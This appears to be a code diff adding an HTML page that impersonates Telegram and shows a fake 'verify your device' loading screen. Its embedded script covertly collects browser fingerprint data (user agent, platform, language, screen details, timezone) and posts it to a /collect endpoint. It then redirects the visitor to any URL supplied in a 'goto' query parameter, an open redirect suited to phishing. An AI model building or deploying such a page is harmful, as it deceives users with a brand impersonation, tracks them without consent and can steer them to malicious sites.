@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Telegram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+  <div class="container">
+    <img src="/static/telegram-logo.png" alt="Telegram" class="logo">
+    <h2>Opening Telegram...</h2>
+    <div class="loading-bar"><div class="bar"></div></div>
+    <p>Please wait while we verify your device.</p>
+  </div>
+
+  <script>
+    const data = {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth
+      },
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    };
+
+    fetch("/collect", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+
+    setTimeout(() => {
+      const url = new URL(window.location.href);
+      const goto = url.searchParams.get("goto") || "https://t.me/YourChannel";
+      window.location.href = goto;
+    }, 4000);
+  </script>
+</body>
+</html>
